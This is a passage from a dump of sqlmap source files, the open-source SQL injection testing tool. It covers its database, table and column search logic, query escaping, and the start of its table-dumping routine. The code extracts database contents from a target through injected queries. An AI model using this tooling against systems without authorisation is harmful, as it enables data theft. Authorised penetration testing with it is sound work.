checkFileDb(self):\n        if not os.path.exists(self.db):\n            errMsg = \"the provided database file '%s' does not exist\" % self.db\n            raise SqlmapFilePathException(errMsg)\n\n    def connect(self):\n        errMsg = \"'connect' method must be defined \"\n        errMsg += \"inside the specific DBMS plugin\"\n        raise SqlmapUndefinedMethod(errMsg)\n\n    def fetchall(self):\n        errMsg = \"'fetchall' method must be defined \"\n        errMsg += \"inside the specific DBMS plugin\"\n        raise SqlmapUndefinedMethod(errMsg)\n\n    def execute(self, query):\n        errMsg = \"'execute' method must be defined \"\n        errMsg += \"inside the specific DBMS plugin\"\n        raise SqlmapUndefinedMethod(errMsg)\n\n    def select(self, query):\n        errMsg = \"'select' method must be defined \"\n        errMsg += \"inside the specific DBMS plugin\"\n        raise SqlmapUndefinedMethod(errMsg)\n", "plugins/generic/search.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport re\n\nfrom lib.core.agent import agent\nfrom lib.core.common import arrayizeValue\nfrom lib.core.common import Backend\nfrom lib.core.common import filterPairValues\nfrom lib.core.common import getLimitRange\nfrom lib.core.common import isInferenceAvailable\nfrom lib.core.common import isNoneValue\nfrom lib.core.common import isNumPosStrValue\nfrom lib.core.common import isTechniqueAvailable\nfrom lib.core.common import readInput\nfrom lib.core.common import safeSQLIdentificatorNaming\nfrom lib.core.common import safeStringFormat\nfrom lib.core.common import unArrayizeValue\nfrom lib.core.common import unsafeSQLIdentificatorNaming\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.data import paths\nfrom lib.core.data import queries\nfrom lib.core.enums import CHARSET_TYPE\nfrom lib.core.enums import DBMS\nfrom lib.core.enums import EXPECTED\nfrom lib.core.enums import PAYLOAD\nfrom lib.core.exception import SqlmapMissingMandatoryOptionException\nfrom lib.core.exception import SqlmapUserQuitException\nfrom lib.core.settings import CURRENT_DB\nfrom lib.core.settings import METADB_SUFFIX\nfrom lib.core.settings import UPPER_CASE_DBMSES\nfrom lib.request import inject\nfrom lib.utils.brute import columnExists\nfrom lib.utils.brute import tableExists\nfrom thirdparty import six\n\nclass Search(object):\n    \"\"\"\n    This class defines search functionalities for plugins.\n    \"\"\"\n\n    def __init__(self):\n        pass\n\n    def searchDb(self):\n        foundDbs = []\n        rootQuery = queries[Backend.getIdentifiedDbms()].search_db\n        dbList = conf.db.split(',')\n\n        if Backend.isDbms(DBMS.MYSQL) and not kb.data.has_information_schema:\n            dbCond = rootQuery.inband.condition2\n        else:\n            dbCond = rootQuery.inband.condition\n\n        dbConsider, dbCondParam = self.likeOrExact(\"database\")\n\n        for db in dbList:\n            values = []\n            db = safeSQLIdentificatorNaming(db)\n\n            if Backend.getIdentifiedDbms() in UPPER_CASE_DBMSES:\n                db = db.upper()\n\n            infoMsg = \"searching database\"\n            if dbConsider == \"1\":\n                infoMsg += \"s LIKE\"\n            infoMsg += \" '%s'\" % unsafeSQLIdentificatorNaming(db)\n            logger.info(infoMsg)\n\n            if conf.excludeSysDbs:\n                exclDbsQuery = \"\".join(\" AND '%s' != %s\" % (unsafeSQLIdentificatorNaming(db), dbCond) for db in self.excludeDbsList)\n                infoMsg = \"skipping system database%s '%s'\" % (\"s\" if len(self.excludeDbsList) > 1 else \"\", \", \".join(db for db in self.excludeDbsList))\n                logger.info(infoMsg)\n            else:\n                exclDbsQuery = \"\"\n\n            dbQuery = \"%s%s\" % (dbCond, dbCondParam)\n            dbQuery = dbQuery % unsafeSQLIdentificatorNaming(db)\n\n            if any(isTechniqueAvailable(_) for _ in (PAYLOAD.TECHNIQUE.UNION, PAYLOAD.TECHNIQUE.ERROR, PAYLOAD.TECHNIQUE.QUERY)) or conf.direct:\n                if Backend.isDbms(DBMS.MYSQL) and not kb.data.has_information_schema:\n                    query = rootQuery.inband.query2\n                else:\n                    query = rootQuery.inband.query\n\n                query = query % (dbQuery + exclDbsQuery)\n                values = inject.getValue(query, blind=False, time=False)\n\n                if not isNoneValue(values):\n                    values = arrayizeValue(values)\n\n                    for value in values:\n                        value = safeSQLIdentificatorNaming(value)\n                        foundDbs.append(value)\n\n            if not values and isInferenceAvailable() and not conf.direct:\n                infoMsg = \"fetching number of database\"\n                if dbConsider == \"1\":\n                    infoMsg += \"s LIKE\"\n                infoMsg += \" '%s'\" % unsafeSQLIdentificatorNaming(db)\n                logger.info(infoMsg)\n\n                if Backend.isDbms(DBMS.MYSQL) and not kb.data.has_information_schema:\n                    query = rootQuery.blind.count2\n                else:\n                    query = rootQuery.blind.count\n\n                query = query % (dbQuery + exclDbsQuery)\n                count = inject.getValue(query, union=False, error=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)\n\n                if not isNumPosStrValue(count):\n                    warnMsg = \"no database\"\n                    if dbConsider == \"1\":\n                        warnMsg += \"s LIKE\"\n                    warnMsg += \" '%s' found\" % unsafeSQLIdentificatorNaming(db)\n                    logger.warning(warnMsg)\n\n                    continue\n\n                indexRange = getLimitRange(count)\n\n                for index in indexRange:\n                    if Backend.isDbms(DBMS.MYSQL) and not kb.data.has_information_schema:\n                        query = rootQuery.blind.query2\n                    else:\n                        query = rootQuery.blind.query\n\n                    query = query % (dbQuery + exclDbsQuery)\n                    query = agent.limitQuery(index, query, dbCond)\n\n                    value = unArrayizeValue(inject.getValue(query, union=False, error=False))\n                    value = safeSQLIdentificatorNaming(value)\n                    foundDbs.append(value)\n\n        conf.dumper.lister(\"found databases\", foundDbs)\n\n    def searchTable(self):\n        bruteForce = False\n\n        if Backend.isDbms(DBMS.MYSQL) and not kb.data.has_information_schema:\n            errMsg = \"information_schema not available, \"\n            errMsg += \"back-end DBMS is MySQL < 5.0\"\n            bruteForce = True\n\n        if bruteForce:\n            message = \"do you want to use common table existence check? %s\" % (\"[Y/n/q]\" if Backend.getIdentifiedDbms() in (DBMS.ACCESS, DBMS.MCKOI, DBMS.EXTREMEDB) else \"[y/N/q]\")\n            choice = readInput(message, default='Y' if 'Y' in message else 'N').upper()\n\n            if choice == 'N':\n                return\n            elif choice == 'Q':\n                raise SqlmapUserQuitException\n            else:\n                regex = '|'.join(conf.tbl.split(','))\n                return tableExists(paths.COMMON_TABLES, regex)\n\n        foundTbls = {}\n        tblList = conf.tbl.split(',')\n        rootQuery = queries[Backend.getIdentifiedDbms()].search_table\n        tblCond = rootQuery.inband.condition\n        dbCond = rootQuery.inband.condition2\n        tblConsider, tblCondParam = self.likeOrExact(\"table\")\n\n        for tbl in tblList:\n            values = []\n            tbl = safeSQLIdentificatorNaming(tbl, True)\n\n            if Backend.getIdentifiedDbms() in UPPER_CASE_DBMSES:\n                tbl = tbl.upper()\n                conf.db = conf.db.upper() if conf.db else conf.db\n\n            infoMsg = \"searching table\"\n            if tblConsider == '1':\n                infoMsg += \"s LIKE\"\n            infoMsg += \" '%s'\" % unsafeSQLIdentificatorNaming(tbl)\n\n            if conf.db == CURRENT_DB:\n                conf.db = self.getCurrentDb()\n\n            if dbCond and conf.db:\n                _ = conf.db.split(',')\n                whereDbsQuery = \" AND (\" + \" OR \".join(\"%s = '%s'\" % (dbCond, unsafeSQLIdentificatorNaming(db)) for db in _) + \")\"\n                infoMsg += \" for database%s '%s'\" % (\"s\" if len(_) > 1 else \"\", \", \".join(db for db in _))\n            elif conf.excludeSysDbs:\n                whereDbsQuery = \"\".join(\" AND '%s' != %s\" % (unsafeSQLIdentificatorNaming(db), dbCond) for db in self.excludeDbsList)\n                msg = \"skipping system database%s '%s'\" % (\"s\" if len(self.excludeDbsList) > 1 else \"\", \", \".join(db for db in self.excludeDbsList))\n                logger.info(msg)\n            else:\n                whereDbsQuery = \"\"\n\n            if dbCond and conf.exclude:\n                whereDbsQuery += \" AND %s NOT LIKE '%s'\" % (dbCond, re.sub(r\"\\.[*+]\", '%', conf.exclude._original))\n\n            logger.info(infoMsg)\n\n            tblQuery = \"%s%s\" % (tblCond, tblCondParam)\n            tblQuery = tblQuery % unsafeSQLIdentificatorNaming(tbl)\n\n            if any(isTechniqueAvailable(_) for _ in (PAYLOAD.TECHNIQUE.UNION, PAYLOAD.TECHNIQUE.ERROR, PAYLOAD.TECHNIQUE.QUERY)) or conf.direct:\n                query = rootQuery.inband.query\n\n                query = query % (tblQuery + whereDbsQuery)\n                values = inject.getValue(query, blind=False, time=False)\n\n                if values and Backend.getIdentifiedDbms() in (DBMS.SQLITE, DBMS.FIREBIRD):\n                    newValues = []\n\n                    if isinstance(values, six.string_types):\n                        values = [values]\n                    for value in values:\n                        dbName = \"SQLite\" if Backend.isDbms(DBMS.SQLITE) else \"Firebird\"\n                        newValues.append([\"%s%s\" % (dbName, METADB_SUFFIX), value])\n\n                    values = newValues\n\n                for foundDb, foundTbl in filterPairValues(values):\n                    foundDb = safeSQLIdentificatorNaming(foundDb)\n                    foundTbl = safeSQLIdentificatorNaming(foundTbl, True)\n\n                    if foundDb is None or foundTbl is None:\n                        continue\n\n                    if foundDb in foundTbls:\n                        foundTbls[foundDb].append(foundTbl)\n                    else:\n                        foundTbls[foundDb] = [foundTbl]\n\n            if not values and isInferenceAvailable() and not conf.direct:\n                if Backend.getIdentifiedDbms() not in (DBMS.SQLITE, DBMS.FIREBIRD):\n                    if len(whereDbsQuery) == 0:\n                        infoMsg = \"fetching number of databases with table\"\n                        if tblConsider == \"1\":\n                            infoMsg += \"s LIKE\"\n                        infoMsg += \" '%s'\" % unsafeSQLIdentificatorNaming(tbl)\n                        logger.info(infoMsg)\n\n                        query = rootQuery.blind.count\n                        query = query % (tblQuery + whereDbsQuery)\n                        count = inject.getValue(query, union=False, error=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)\n\n                        if not isNumPosStrValue(count):\n                            warnMsg = \"no databases have table\"\n                            if tblConsider == \"1\":\n                                warnMsg += \"s LIKE\"\n                            warnMsg += \" '%s'\" % unsafeSQLIdentificatorNaming(tbl)\n                            logger.warning(warnMsg)\n\n                            continue\n\n                        indexRange = getLimitRange(count)\n\n                        for index in indexRange:\n                            query = rootQuery.blind.query\n                            query = query % (tblQuery + whereDbsQuery)\n                            query = agent.limitQuery(index, query)\n\n                            foundDb = unArrayizeValue(inject.getValue(query, union=False, error=False))\n                            foundDb = safeSQLIdentificatorNaming(foundDb)\n\n                            if foundDb not in foundTbls:\n                                foundTbls[foundDb] = []\n\n                            if tblConsider == \"2\":\n                                foundTbls[foundDb].append(tbl)\n\n                        if tblConsider == \"2\":\n                            continue\n                    else:\n                        for db in conf.db.split(',') if conf.db else (self.getCurrentDb(),):\n                            db = safeSQLIdentificatorNaming(db)\n                            if db not in foundTbls:\n                                foundTbls[db] = []\n                else:\n                    dbName = \"SQLite\" if Backend.isDbms(DBMS.SQLITE) else \"Firebird\"\n                    foundTbls[\"%s%s\" % (dbName, METADB_SUFFIX)] = []\n\n                for db in foundTbls:\n                    db = safeSQLIdentificatorNaming(db)\n\n                    infoMsg = \"fetching number of table\"\n                    if tblConsider == \"1\":\n                        infoMsg += \"s LIKE\"\n                    infoMsg += \" '%s' in database '%s'\" % (unsafeSQLIdentificatorNaming(tbl), unsafeSQLIdentificatorNaming(db))\n                    logger.info(infoMsg)\n\n                    query = rootQuery.blind.count2\n                    if Backend.getIdentifiedDbms() not in (DBMS.SQLITE, DBMS.FIREBIRD):\n                        query = query % unsafeSQLIdentificatorNaming(db)\n                    query += \" AND %s\" % tblQuery\n\n                    count = inject.getValue(query, union=False, error=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)\n\n                    if not isNumPosStrValue(count):\n                        warnMsg = \"no table\"\n                        if tblConsider == \"1\":\n                            warnMsg += \"s LIKE\"\n                        warnMsg += \" '%s' \" % unsafeSQLIdentificatorNaming(tbl)\n                        warnMsg += \"in database '%s'\" % unsafeSQLIdentificatorNaming(db)\n                        logger.warning(warnMsg)\n\n                        continue\n\n                    indexRange = getLimitRange(count)\n\n                    for index in indexRange:\n                        query = rootQuery.blind.query2\n\n                        if \" ORDER BY \" in query:\n                            query = query.replace(\" ORDER BY \", \"%s ORDER BY \" % (\" AND %s\" % tblQuery))\n                        elif query.endswith(\"'%s')\"):\n                            query = query[:-1] + \" AND %s)\" % tblQuery\n                        else:\n                            query += \" AND %s\" % tblQuery\n\n                        if Backend.isDbms(DBMS.FIREBIRD):\n                            query = safeStringFormat(query, index)\n\n                        if Backend.getIdentifiedDbms() not in (DBMS.SQLITE, DBMS.FIREBIRD):\n                            query = safeStringFormat(query, unsafeSQLIdentificatorNaming(db))\n\n                        if not Backend.isDbms(DBMS.FIREBIRD):\n                            query = agent.limitQuery(index, query)\n\n                        foundTbl = unArrayizeValue(inject.getValue(query, union=False, error=False))\n                        if not isNoneValue(foundTbl):\n                            kb.hintValue = foundTbl\n                            foundTbl = safeSQLIdentificatorNaming(foundTbl, True)\n                            foundTbls[db].append(foundTbl)\n\n        for db in list(foundTbls.keys()):\n            if isNoneValue(foundTbls[db]):\n                del foundTbls[db]\n\n        if not foundTbls:\n            warnMsg = \"no databases contain any of the provided tables\"\n            logger.warning(warnMsg)\n            return\n\n        conf.dumper.dbTables(foundTbls)\n        self.dumpFoundTables(foundTbls)\n\n    def searchColumn(self):\n        bruteForce = False\n\n        self.forceDbmsEnum()\n\n        if Backend.isDbms(DBMS.MYSQL) and not kb.data.has_information_schema:\n            errMsg = \"information_schema not available, \"\n            errMsg += \"back-end DBMS is MySQL < 5.0\"\n            bruteForce = True\n\n        if bruteForce:\n            message = \"do you want to use common column existence check? %s\" % (\"[Y/n/q]\" if Backend.getIdentifiedDbms() in (DBMS.ACCESS, DBMS.MCKOI, DBMS.EXTREMEDB) else \"[y/N/q]\")\n            choice = readInput(message, default='Y' if 'Y' in message else 'N').upper()\n\n            if choice == 'N':\n                return\n            elif choice == 'Q':\n                raise SqlmapUserQuitException\n            else:\n                regex = '|'.join(conf.col.split(','))\n                conf.dumper.dbTableColumns(columnExists(paths.COMMON_COLUMNS, regex))\n\n                message = \"do you want to dump entries? [Y/n] \"\n\n                if readInput(message, default='Y', boolean=True):\n                    self.dumpAll()\n\n                return\n\n        rootQuery = queries[Backend.getIdentifiedDbms()].search_column\n        foundCols = {}\n        dbs = {}\n        whereDbsQuery = \"\"\n        whereTblsQuery = \"\"\n        infoMsgTbl = \"\"\n        infoMsgDb = \"\"\n        colList = conf.col.split(',')\n\n        if conf.exclude:\n            colList = [_ for _ in colList if re.search(conf.exclude, _, re.I) is None]\n\n        origTbl = conf.tbl\n        origDb = conf.db\n        colCond = rootQuery.inband.condition\n        dbCond = rootQuery.inband.condition2\n        tblCond = rootQuery.inband.condition3\n        colConsider, colCondParam = self.likeOrExact(\"column\")\n\n        for column in colList:\n            values = []\n            column = safeSQLIdentificatorNaming(column)\n            conf.db = origDb\n            conf.tbl = origTbl\n\n            if Backend.getIdentifiedDbms() in UPPER_CASE_DBMSES:\n                column = column.upper()\n                conf.db = conf.db.upper() if conf.db else conf.db\n                conf.tbl = conf.tbl.upper() if conf.tbl else conf.tbl\n\n            infoMsg = \"searching column\"\n            if colConsider == \"1\":\n                infoMsg += \"s LIKE\"\n            infoMsg += \" '%s'\" % unsafeSQLIdentificatorNaming(column)\n\n            foundCols[column] = {}\n\n            if tblCond:\n                if conf.tbl:\n                    tbls = conf.tbl.split(',')\n                    if conf.exclude:\n                        tbls = [_ for _ in tbls if re.search(conf.exclude, _, re.I) is None]\n                    whereTblsQuery = \" AND (\" + \" OR \".join(\"%s = '%s'\" % (tblCond, unsafeSQLIdentificatorNaming(tbl)) for tbl in tbls) + \")\"\n                    infoMsgTbl = \" for table%s '%s'\" % (\"s\" if len(tbls) > 1 else \"\", \", \".join(unsafeSQLIdentificatorNaming(tbl) for tbl in tbls))\n\n            if conf.db == CURRENT_DB:\n                conf.db = self.getCurrentDb()\n\n            if dbCond:\n                if conf.db:\n                    _ = conf.db.split(',')\n                    whereDbsQuery = \" AND (\" + \" OR \".join(\"%s = '%s'\" % (dbCond, unsafeSQLIdentificatorNaming(db)) for db in _) + \")\"\n                    infoMsgDb = \" in database%s '%s'\" % (\"s\" if len(_) > 1 else \"\", \", \".join(unsafeSQLIdentificatorNaming(db) for db in _))\n                elif conf.excludeSysDbs:\n                    whereDbsQuery = \"\".join(\" AND %s != '%s'\" % (dbCond, unsafeSQLIdentificatorNaming(db)) for db in self.excludeDbsList)\n                    msg = \"skipping system database%s '%s'\" % (\"s\" if len(self.excludeDbsList) > 1 else \"\", \", \".join(unsafeSQLIdentificatorNaming(db) for db in self.excludeDbsList))\n                    logger.info(msg)\n                else:\n                    infoMsgDb = \" across all databases\"\n\n                if conf.exclude:\n                    whereDbsQuery += \" AND %s NOT LIKE '%s'\" % (dbCond, re.sub(r\"\\.[*+]\", '%', conf.exclude._original))\n\n            logger.info(\"%s%s%s\" % (infoMsg, infoMsgTbl, infoMsgDb))\n\n            colQuery = \"%s%s\" % (colCond, colCondParam)\n            colQuery = colQuery % unsafeSQLIdentificatorNaming(column)\n\n            if any(isTechniqueAvailable(_) for _ in (PAYLOAD.TECHNIQUE.UNION, PAYLOAD.TECHNIQUE.ERROR, PAYLOAD.TECHNIQUE.QUERY)) or conf.direct:\n                if not all((conf.db, conf.tbl)):\n                    # Enumerate tables containing the column provided if\n                    # either of database(s) or table(s) is not provided\n                    query = rootQuery.inband.query\n                    query = query % (colQuery + whereDbsQuery + whereTblsQuery)\n                    values = inject.getValue(query, blind=False, time=False)\n                else:\n                    # Assume provided databases' tables contain the\n                    # column(s) provided\n                    values = []\n\n                    for db in conf.db.split(','):\n                        for tbl in conf.tbl.split(','):\n                            values.append([safeSQLIdentificatorNaming(db), safeSQLIdentificatorNaming(tbl, True)])\n\n                for db, tbl in filterPairValues(values):\n                    db = safeSQLIdentificatorNaming(db)\n                    tbls = tbl.split(',') if not isNoneValue(tbl) else []\n\n                    for tbl in tbls:\n                        tbl = safeSQLIdentificatorNaming(tbl, True)\n\n                        if db is None or tbl is None:\n                            continue\n\n                        conf.db = db\n                        conf.tbl = tbl\n                        conf.col = column\n\n                        self.getColumns(onlyColNames=True, colTuple=(colConsider, colCondParam), bruteForce=False)\n\n                        if db in kb.data.cachedColumns and tbl in kb.data.cachedColumns[db]:\n                            if db not in dbs:\n                                dbs[db] = {}\n\n                            if tbl not in dbs[db]:\n                                dbs[db][tbl] = {}\n\n                            dbs[db][tbl].update(kb.data.cachedColumns[db][tbl])\n\n                            if db in foundCols[column]:\n                                foundCols[column][db].append(tbl)\n                            else:\n                                foundCols[column][db] = [tbl]\n\n                        kb.data.cachedColumns = {}\n\n            if not values and isInferenceAvailable() and not conf.direct:\n                if not conf.db:\n                    infoMsg = \"fetching number of databases with tables containing column\"\n                    if colConsider == \"1\":\n                        infoMsg += \"s LIKE\"\n                    infoMsg += \" '%s'\" % unsafeSQLIdentificatorNaming(column)\n                    logger.info(\"%s%s%s\" % (infoMsg, infoMsgTbl, infoMsgDb))\n\n                    query = rootQuery.blind.count\n                    query = query % (colQuery + whereDbsQuery + whereTblsQuery)\n                    count = inject.getValue(query, union=False, error=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)\n\n                    if not isNumPosStrValue(count):\n                        warnMsg = \"no databases have tables containing column\"\n                        if colConsider == \"1\":\n                            warnMsg += \"s LIKE\"\n                        warnMsg += \" '%s'\" % unsafeSQLIdentificatorNaming(column)\n                        logger.warning(\"%s%s\" % (warnMsg, infoMsgTbl))\n\n                        continue\n\n                    indexRange = getLimitRange(count)\n\n                    for index in indexRange:\n                        query = rootQuery.blind.query\n                        query = query % (colQuery + whereDbsQuery + whereTblsQuery)\n                        query = agent.limitQuery(index, query)\n\n                        db = unArrayizeValue(inject.getValue(query, union=False, error=False))\n                        db = safeSQLIdentificatorNaming(db)\n\n                        if db not in dbs:\n                            dbs[db] = {}\n\n                        if db not in foundCols[column]:\n                            foundCols[column][db] = []\n                else:\n                    for db in conf.db.split(',') if conf.db else (self.getCurrentDb(),):\n                        db = safeSQLIdentificatorNaming(db)\n                        if db not in foundCols[column]:\n                            foundCols[column][db] = []\n\n                origDb = conf.db\n                origTbl = conf.tbl\n\n                for column, dbData in foundCols.items():\n                    colQuery = \"%s%s\" % (colCond, colCondParam)\n                    colQuery = colQuery % unsafeSQLIdentificatorNaming(column)\n\n                    for db in dbData:\n                        conf.db = origDb\n                        conf.tbl = origTbl\n\n                        infoMsg = \"fetching number of tables containing column\"\n                        if colConsider == \"1\":\n                            infoMsg += \"s LIKE\"\n                        infoMsg += \" '%s' in database '%s'\" % (unsafeSQLIdentificatorNaming(column), unsafeSQLIdentificatorNaming(db))\n                        logger.info(infoMsg)\n\n                        query = rootQuery.blind.count2\n                        if not re.search(r\"(?i)%s\\Z\" % METADB_SUFFIX, db or \"\"):\n                            query = query % unsafeSQLIdentificatorNaming(db)\n                            query += \" AND %s\" % colQuery\n                        else:\n                            query = query % colQuery\n\n                        query += whereTblsQuery\n\n                        count = inject.getValue(query, union=False, error=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)\n\n                        if not isNumPosStrValue(count):\n                            warnMsg = \"no tables contain column\"\n                            if colConsider == \"1\":\n                                warnMsg += \"s LIKE\"\n                            warnMsg += \" '%s' \" % unsafeSQLIdentificatorNaming(column)\n                            warnMsg += \"in database '%s'\" % unsafeSQLIdentificatorNaming(db)\n                            logger.warning(warnMsg)\n\n                            continue\n\n                        indexRange = getLimitRange(count)\n\n                        for index in indexRange:\n                            query = rootQuery.blind.query2\n\n                            if re.search(r\"(?i)%s\\Z\" % METADB_SUFFIX, db or \"\"):\n                                query = query % (colQuery + whereTblsQuery)\n                            elif query.endswith(\"'%s')\"):\n                                query = query[:-1] + \" AND %s)\" % (colQuery + whereTblsQuery)\n                            elif \" ORDER BY \" in query:\n                                query = query.replace(\" ORDER BY \", \" AND %s ORDER BY \" % (colQuery + whereTblsQuery))\n                            else:\n                                query += \" AND %s\" % (colQuery + whereTblsQuery)\n\n                            query = safeStringFormat(query, unsafeSQLIdentificatorNaming(db))\n                            query = agent.limitQuery(index, query)\n\n                            tbl = unArrayizeValue(inject.getValue(query, union=False, error=False))\n                            kb.hintValue = tbl\n\n                            tbl = safeSQLIdentificatorNaming(tbl, True)\n\n                            conf.db = db\n                            conf.tbl = tbl\n                            conf.col = column\n\n                            self.getColumns(onlyColNames=True, colTuple=(colConsider, colCondParam), bruteForce=False)\n\n                            if db in kb.data.cachedColumns and tbl in kb.data.cachedColumns[db]:\n                                if db not in dbs:\n                                    dbs[db] = {}\n\n                                if tbl not in dbs[db]:\n                                    dbs[db][tbl] = {}\n\n                                dbs[db][tbl].update(kb.data.cachedColumns[db][tbl])\n\n                            kb.data.cachedColumns = {}\n\n                            if db in foundCols[column]:\n                                foundCols[column][db].append(tbl)\n                            else:\n                                foundCols[column][db] = [tbl]\n\n        if dbs:\n            conf.dumper.dbColumns(foundCols, colConsider, dbs)\n            self.dumpFoundColumn(dbs, foundCols, colConsider)\n        else:\n            warnMsg = \"no databases have tables containing any of the \"\n            warnMsg += \"provided columns\"\n            logger.warning(warnMsg)\n\n    def search(self):\n        if Backend.getIdentifiedDbms() in UPPER_CASE_DBMSES:\n            for item in ('db', 'tbl', 'col'):\n                if getattr(conf, item, None):\n                    setattr(conf, item, getattr(conf, item).upper())\n\n        if conf.col:\n            self.searchColumn()\n        elif conf.tbl:\n            self.searchTable()\n        elif conf.db:\n            self.searchDb()\n        else:\n            errMsg = \"missing parameter, provide -D, -T or -C along \"\n            errMsg += \"with --search\"\n            raise SqlmapMissingMandatoryOptionException(errMsg)\n", "plugins/generic/syntax.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport re\n\nfrom lib.core.common import Backend\nfrom lib.core.convert import getBytes\nfrom lib.core.data import conf\nfrom lib.core.enums import DBMS\nfrom lib.core.exception import SqlmapUndefinedMethod\n\nclass Syntax(object):\n    \"\"\"\n    This class defines generic syntax functionalities for plugins.\n    \"\"\"\n\n    def __init__(self):\n        pass\n\n    @staticmethod\n    def _escape(expression, quote=True, escaper=None):\n        retVal = expression\n\n        if quote:\n            for item in re.findall(r\"'[^']*'+\", expression):\n                original = item[1:-1]\n                if original:\n                    if Backend.isDbms(DBMS.SQLITE) and \"X%s\" % item in expression:\n                        continue\n                    if re.search(r\"\\[(SLEEPTIME|RAND)\", original) is None:  # e.g. '[SLEEPTIME]' marker\n                        replacement = escaper(original) if not conf.noEscape else original\n\n                        if replacement != original:\n                            retVal = retVal.replace(item, replacement)\n                        elif len(original) != len(getBytes(original)) and \"n'%s'\" % original not in retVal and Backend.getDbms() in (DBMS.MYSQL, DBMS.PGSQL, DBMS.ORACLE, DBMS.MSSQL):\n                            retVal = retVal.replace(\"'%s'\" % original, \"n'%s'\" % original)\n        else:\n            retVal = escaper(expression)\n\n        return retVal\n\n    @staticmethod\n    def escape(expression, quote=True):\n        errMsg = \"'escape' method must be defined \"\n        errMsg += \"inside the specific DBMS plugin\"\n        raise SqlmapUndefinedMethod(errMsg)\n", "plugins/generic/entries.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport re\n\nfrom lib.core.agent import agent\nfrom lib.core.bigarray import BigArray\nfrom lib.core.common import Backend\nfrom lib.core.common import clearConsoleLine\nfrom lib.core.common import getLimitRange\nfrom lib.core.common import getSafeExString\nfrom lib.core.common import isInferenceAvailable\nfrom lib.core.common import isListLike\nfrom lib.core.common import isNoneValue\nfrom lib.core.common import isNumPosStrValue\nfrom lib.core.common import isTechniqueAvailable\nfrom lib.core.common import prioritySortColumns\nfrom lib.core.common import readInput\nfrom lib.core.common import safeSQLIdentificatorNaming\nfrom lib.core.common import singleTimeLogMessage\nfrom lib.core.common import singleTimeWarnMessage\nfrom lib.core.common import unArrayizeValue\nfrom lib.core.common import unsafeSQLIdentificatorNaming\nfrom lib.core.convert import getConsoleLength\nfrom lib.core.convert import getUnicode\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.data import queries\nfrom lib.core.dicts import DUMP_REPLACEMENTS\nfrom lib.core.enums import CHARSET_TYPE\nfrom lib.core.enums import DBMS\nfrom lib.core.enums import EXPECTED\nfrom lib.core.enums import PAYLOAD\nfrom lib.core.exception import SqlmapConnectionException\nfrom lib.core.exception import SqlmapMissingMandatoryOptionException\nfrom lib.core.exception import SqlmapNoneDataException\nfrom lib.core.exception import SqlmapUnsupportedFeatureException\nfrom lib.core.settings import CHECK_ZERO_COLUMNS_THRESHOLD\nfrom lib.core.settings import CURRENT_DB\nfrom lib.core.settings import METADB_SUFFIX\nfrom lib.core.settings import NULL\nfrom lib.core.settings import PLUS_ONE_DBMSES\nfrom lib.core.settings import UPPER_CASE_DBMSES\nfrom lib.request import inject\nfrom lib.utils.hash import attackDumpedTable\nfrom lib.utils.pivotdumptable import pivotDumpTable\nfrom thirdparty import six\nfrom thirdparty.six.moves import zip as _zip\n\nclass Entries(object):\n    \"\"\"\n    This class defines entries' enumeration functionalities for plugins.\n    \"\"\"\n\n    def __init__(self):\n        pass\n\n    def dumpTable(self, foundData=None):\n        self.forceDbmsEnum()\n\n        if conf.db is None or conf.db == CURRENT_DB:\n            if conf.db is None:\n                warnMsg = \"missing database parameter. sqlmap is going \"\n                warnMsg += \"to use the current database to enumerate \"\n                warnMsg += \"table(s) entries\"\n                logger.warning(warnMsg)\n\n            conf.db = self.getCurrentDb()\n\n        elif conf.db is not None:\n            if Backend.getIdentifiedDbms() in UPPER_CASE_DBMSES:\n                conf.db = conf.db.upper()\n\n            if ',' in conf.db:\n                errMsg = \"only one database name is allowed when enumerating \"\n                errMsg += \"the tables' columns\"\n                raise SqlmapMissingMandatoryOptionException(errMsg)\n\n            if conf.exclude and re.search(conf.exclude, conf.db, re.I) is not None:\n                infoMsg = \"skipping database '%s'\" % unsafeSQLIdentificatorNaming(conf.db)\n                singleTimeLogMessage(infoMsg)\n                return\n\n        conf.db = safeSQLIdentificatorNaming(conf.db) or \"\"\n\n        if conf.tbl:\n            if Backend.getIdentifiedDbms() in UPPER_CASE_DBMSES:\n                conf.tbl = conf.tbl.upper()\n\n            tblList = conf.tbl.split(',')\n        else:\n            self.getTables()\n\n            if len(kb.data.cachedTables) > 0:\n                tblList = list(six.itervalues(kb.data.cachedTables))\n\n                if tblList and isListLike(tblList[0]):\n                    tblList = tblList[0]\n            elif conf.db and not conf.search:\n                errMsg = \"unable to retrieve the tables \"\n                errMsg += \"in database '%s'\" % unsafeSQLIdentificatorNaming(conf.db)\n                raise SqlmapNoneDataException(errMsg)\n            else:\n                return\n\n        for tbl in tblList:\n            tblList[tblList.index(tbl)] = safeSQLIdentificatorNaming(tbl, True)\n\n        for tbl in tblList:\n            if kb.dumpKeyboardInterrupt:\n                break\n\n            if conf.exclude and re.search(conf.exclude, tbl, re.I) is not None:\n                infoMsg = \"skipping table '%s'\" % unsafeSQLIdentificatorNaming(tbl)\n                singleTimeLogMessage(infoMsg)\n                continue\n\n            conf.tbl = tbl\n            kb.data.dumpedTable = {}\n\n            if foundData is None:\n                kb.data.cachedColumns = {}\n                self.getColumns(onlyColNames=True, dumpMode=True)\n            else:\n                kb.data.cachedColumns = foundData\n\n            try:\n                if Backend.isDbms(DBMS.INFORMIX):\n                    kb.dumpTable = \"%s:%s\" % (conf.db, tbl)\n                elif Backend.isDbms(DBMS.SQLITE):\n                    kb.dumpTable = tbl\n                elif METADB_SUFFIX.upper() in conf.db.upper():\n                    